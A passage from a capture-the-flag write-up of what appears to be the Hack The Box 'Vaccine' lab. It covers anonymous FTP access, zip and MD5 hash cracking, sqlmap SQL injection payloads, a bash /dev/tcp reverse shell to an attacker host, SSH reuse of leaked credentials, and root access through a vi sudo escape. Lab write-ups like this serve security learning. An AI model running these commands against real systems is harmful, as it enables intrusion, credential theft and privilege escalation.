+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 4614 ::
+
+Finished ffuf scan
+                                                                                                                                                                  
+=========================
+                                                                                                                                                                  
+                                                                                                                                                                  
+                                                                                                                                                                  
+---------------------Finished all scans------------------------    
+
+
+```
+
+We can see here our scan revealed a number of outstanding issues. We have a webserver, FTP, and SSH services running.
+
+ 1. The FTP server can be accessed with the anonymous login
+ 2. There are numerous CVE vulnerabilites to be explored for both SSH and the webserver
+
+Since we can access the ftp server easily, we can start there:
+
+```
+└─$ ftp 10.129.187.99
+
+Connected to 10.129.187.99.
+220 (vsFTPd 3.0.3)
+Name (10.129.187.99:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> dir
+
+229 Entering Extended Passive Mode (|||10235|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+226 Directory send OK.
+
+ftp> get backup.zip
+
+local: backup.zip remote: backup.zip
+229 Entering Extended Passive Mode (|||10583|)
+150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+100% |********************************************************************************************************************|  2533      116.83 KiB/s    00:00 ETA
+226 Transfer complete.
+2533 bytes received in 00:00 (20.68 KiB/s)
+
+zsh: suspended  ftp 10.129.187.99
+```
+There appeared to be one file that could be extracted, a ```backup.zip``` file.
+
+Unfortunately, it appears this file is locked behind a password. We can try next to crack it using John the Ripper:
+
+```
+└─$ sudo zip2john backup.zip > backup.txt 
+               
+
+Created directory: /root/.john
+ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
+ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+                                                                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ cat backup.txt             
+backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
+                                                                                                                                            
+
+└─$ john -w=/usr/share/wordlists/rockyou.txt backup.txt
+ 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (backup.zip)     
+1g 0:00:00:00 DONE (2022-07-30 18:21) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+It appears the cracking is successful, and we uncovered the file password to be: ```741852963```.
+
+We can now attempt to unzip the file and view the contents:
+
+
+```
+Archive:  backup.zip
+[backup.zip] index.php password: 
+  inflating: index.php               
+  inflating: style.css                                      
+```
+We can see we uncovered two files ```index.php``` and ```style.css```. 
+
+Let's analyze index.php as that is the more important one:
+
+```
+cat index.php 
+
+<!DOCTYPE html>
+<?php
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+?>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>MegaCorp Login</title>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">
+
+</head>
+  <h1 align=center>MegaCorp Login</h1>
+<body>
+<!-- partial:index.partial.html -->
+<body class="align">
+
+  <div class="grid">
+
+    <form action="" method="POST" class="form login">
+
+      <div class="form__field">
+        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
+        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
+      </div>
+
+      <div class="form__field">
+        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
+        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
+      </div>
+
+      <div class="form__field">
+        <input type="submit" value="Sign In">
+      </div>
+
+    </form>
+
+
+  </div>
+
+  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>
+
+</body>
+<!-- partial -->
+  
+</body>
+</html>
+```
+Post analysis, we see a potential username and password combination in the file. The password appears to be hashed using MD5:
+
+```
+USERNAME: admin
+PASSWORD: 2cb42f8734ea607eefed3b70af13bbd3 (MD5)
+```
+We can try using John the Ripper again to crack the hash, this time specifying MD5:
+
+```
+└─$ echo 2cb42f8734ea607eefed3b70af13bbd3 > admin.txt
+
+└─$ john -w=/usr/share/wordlists/rockyou.txt admin.txt --format=raw-md5    
+    
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+qwerty789        (?)     
+1g 0:00:00:00 DONE (2022-07-30 18:39) 100.0g/s 10022Kp/s 10022Kc/s 10022KC/s roslin..pogimo
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+```
+Our crack appears to be successful, we now have the credentials:
+
+```
+USERNAME: admin
+PASSWORD: qwerty789
+```
+We can can now make use of them and try them in an alternative service. Loading up the webpage, we are greeted with a login:
+
+![Screenshot_2022-07-30_19_21_34](https://user-images.githubusercontent.com/59018247/182003349-36a91b6e-ad5c-4cc8-aa31-38e11f2f9a24.png)
+
+Using our username/password combo, we successfully break in:
+
+![Screenshot_2022-07-31_08_27_33](https://user-images.githubusercontent.com/59018247/182026361-5034b09d-592d-4fe0-920d-624da8934d6c.png)
+
+We can see the website is using a database backend to store information to a table. We can look at injection tools to help use find vulnerabilies for this input field.
+
+A great tool to try first is sqlmap, we can pass along the url to the search alond with our browser cookie ID:
+
+```
+URL: http://10.129.187.99/dashboard.php?search=any+query
+COOKIE SESSION: 2o765usoa104mdu0dkdc5h5rjh
+
+```
+Running the command:
+
+```
+└─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh"
+        ___
+       __H__                                                                                                                                                     
+ ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                         
+|_ -| . ["]     | .'| . |                                                                                                                                        
+|___|_  ["]_|_|_|__,|  _|                                                                                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                                                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:37:52 /2022-07-30/
+
+[19:37:52] [INFO] testing connection to the target URL
+[19:37:52] [INFO] testing if the target URL content is stable
+[19:37:52] [INFO] target URL content is stable
+[19:37:52] [INFO] testing if GET parameter 'search' is dynamic
+[19:37:53] [WARNING] GET parameter 'search' does not appear to be dynamic
+[19:37:53] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
+[19:37:53] [INFO] testing for SQL injection on GET parameter 'search'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
+[19:38:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:38:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:38:16] [INFO] testing 'Generic inline queries'
+[19:38:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[19:38:18] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
+[19:38:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:38:18] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[19:38:18] [INFO] testing 'PostgreSQL inline queries'
+[19:38:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:38:18] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                                                           
+[19:38:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+[19:38:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:38:41] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[19:38:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=any query' AND (SELECT (CASE WHEN (9821=9821) THEN NULL ELSE CAST((CHR(113)||CHR(97)||CHR(109)||CHR(120)) AS NUMERIC) END)) IS NULL-- kOWK
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=any query' AND 9734=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9734=9734) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- xiVl
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=any query' AND 8587=(SELECT 8587 FROM PG_SLEEP(5))-- vMMM
+---
+[19:39:16] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[19:39:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.187.99'
+
+[*] ending @ 19:39:17 /2022-07-30/
+
+```
+We discover the sqlmap has found a vulnerability! We can now re-run the command and use the ```--os-shell``` flag to give a shell:
+
+```     
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh" --os-shell
+        ___
+       __H__                                                                                                                                                     
+ ___ ___[']_____ ___ ___  {1.6.6#stable}                                                                                                                         
+|_ -| . [,]     | .'| . |                                                                                                                                        
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                                                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:42:02 /2022-07-30/
+
+[19:42:02] [INFO] resuming back-end DBMS 'postgresql' 
+[19:42:02] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=any query' AND (SELECT (CASE WHEN (9821=9821) THEN NULL ELSE CAST((CHR(113)||CHR(97)||CHR(109)||CHR(120)) AS NUMERIC) END)) IS NULL-- kOWK
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=any query' AND 9734=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9734=9734) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- xiVl
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=any query' AND 8587=(SELECT 8587 FROM PG_SLEEP(5))-- vMMM
+---
+[19:42:02] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[19:42:02] [INFO] fingerprinting the back-end DBMS operating system
+[19:42:03] [INFO] the back-end DBMS operating system is Linux
+[19:42:04] [INFO] testing if current user is DBA
+[19:42:05] [INFO] retrieved: '1'
+[19:42:05] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[19:42:05] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> 
+```
+We have successfully accessed the shell! We can now use netcat to move the shell over to our host system:
+
+```
+└─$ sudo nc -lvnp 443                                      
+[sudo] password for kali: 
+listening on [any] 443 ...
+```
+```
+os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.37/443 0>&1"
+
+do you want to retrieve the command standard output? [Y/n/a] y
+[19:45:48] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+```
+```
+connect to [10.10.16.37] from (UNKNOWN) [10.129.187.99] 44046
+bash: cannot set terminal process group (4176): Inappropriate ioctl for device
+bash: no job control in this shell
+
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+```
+We have now been granted shell access on our machine with permissions of user postgress.
+
+In browsing around we notice our nineteenth flag!
+
+```
+postgres@vaccine:/var/lib/postgresql$ cat user.txt
+
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+```
+Now would be a good time to try to escalate privileges to gain admin access. We can try searching the webserver files for more clues:
+
+```
+postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
+
+postgres@vaccine:/var/www/html$ ls
+
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+                                                                                                                                
+postgres@vaccine:/var/www/html$ cat dashboard.php
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="./dashboard.css">
+  <script src="https://use.fontawesome.com/33a3739634.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+ <div id="wrapper">
+ <div class="parent">
+  <h1 align="left">MegaCorp Car Catalogue</h1>
+<form action="" method="GET">
+<div class="search-box">
+  <input type="search" name="search" placeholder="Search" />
+  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
+</div>
+</form>
+  </div>
+  
+  <table id="keywords" cellspacing="0" cellpadding="0">
+    <thead>
+      <tr>
+        <th><span style="color: white">Name</span></th>
+        <th><span style="color: white">Type</span></th>
+        <th><span style="color: white">Fuel</span></th>
+        <th><span style="color: white">Engine</span></th>
+      </tr>
+    </thead>
+    <tbody>
+        <?php
+        session_start();
+        if($_SESSION['login'] !== "true") {
+          header("Location: index.php");
+          die();
+        }
+        try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+        }
+
+        catch ( exception $e ) {
+          echo $e->getMessage();
+        }
+
+        if(isset($_REQUEST['search'])) {
+
+          $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
+
+          $result = pg_query($conn,$q);
+
+          if (!$result)
+          {
+                            die(pg_last_error($conn));
+          }
+          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+              {
+                echo "
+                  <tr>
+                    <td class='lalign'>$row[1]</td>
+                    <td>$row[2]</td>
+                    <td>$row[3]</td>
+                    <td>$row[4]</td>
+                  </tr>";
+            }
+        }
+        else {
+
+          $q = "Select * from cars";
+
+          $result = pg_query($conn,$q);
+
+          if (!$result)
+          {
+                            die(pg_last_error($conn));
+          }
+          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+              {
+                echo "
+                  <tr>
+                    <td class='lalign'>$row[1]</td>
+                    <td>$row[2]</td>
+                    <td>$row[3]</td>
+                    <td>$row[4]</td>
+                  </tr>";
+            }
+        }
+
+
+      ?>
+    </tbody>
+  </table>
+ </div> 
+</body>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>
+
+</body>
+</html>
+```
+Scanning the file, we notice an interesting line:
+```
+"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")
+```
+We can try to use these credentials to log into SSH:
+
+```
+└─$ ssh postgres@10.129.187.99
+
+The authenticity of host '10.129.187.99 (10.129.187.99)' can't be established.
+ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.129.187.99' (ED25519) to the list of known hosts.
+postgres@10.129.187.99's password: 
+Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 31 Jul 2022 12:12:02 AM UTC
+
+  System load:  0.0               Processes:             187
+  Usage of /:   32.6% of 8.73GB   Users logged in:       0
+  Memory usage: 20%               IP address for ens160: 10.129.187.99
+  Swap usage:   0%
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+postgres@vaccine:~$ 
+```
+Logging in was a success! We upgraded to a more stable connection and we can now check out privileges:
+```
+postgres@vaccine:~$ sudo -l
+[sudo] password for postgres: 
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+postgres@vaccine:~$ 
+```
+It appears we have been granted su access for the following commands ```/bin/vi /etc/postgresql/11/main/pg_hba.conf```:
+```
+postgres@vaccine:~$ sudo /bin/vi
+Sorry, user postgres is not allowed to execute '/bin/vi' as root on vaccine.
+postgres@vaccine:~$ /etc/postgresql/11/main/pg_hba.conf
+```
+Unfortunately, it won't allow us access. We can try to find a vi exploit where we can use that to get root access.
+
+In doing some digging, we find that an [exploit](https://gtfobins.github.io/gtfobins/vi/) can be done executing the following commands in vi:
+
+```
+:set shell=/bin/sh
+:shell
+```
+In doing so, we are finally presented with root access!
+
+```
+# whoami 
+
+root
+# 
+```
+```
+# ls
+
+pg_hba.conf  root.txt  snap
+
+# cat root.txt
+
+dd6e058e814260bc70e9bbdef2715849
+# 
+```
+
+We uncovereed our twentieth flag.
+
+## Conclusions - Level 3 Vaccine
+
+| # | 	Tools 	| Description |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	sqlmap   |    	Applies automated sql injections |
+| 3 | 	john   |    	Password and hash cracking |  
+| 4 | 	netcat   |    	host listening to establish a reverse shell |  
+ 
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
+| 1 | 	FTP server running  |    	X |  |  |  |
+| 2 | 	Improper storage of PII |    	X |  |  |  |
+| 3 | 	Non-patched apache webserver |    	X |  |  |  |
+
+Using nmap, we were able to discover the host was running an website on port 80, FTP on port 21, and SSH on  port 22. We were then able to get access to the ftp server using anonymous credentials. We then used John to crack the password for a zip file that was being stored. From there, we had access a website database page, we we noticed a was potentially vulnerable to sql injection.
+
+We then used sqpmap to perform a sql injectiom, which gave us shell access to the system. This gave us user permissions, which gave us the user flag. Analyzing files on the server, we then found SSH login credentials that we used to access the server via SSH. Upon doing so, we noticed possible root escalation using a vi shell exploit. Doing so granted us root access, we gave us about admin flag. 
+
+
+[Table of Contents](#table-of-contents)
+
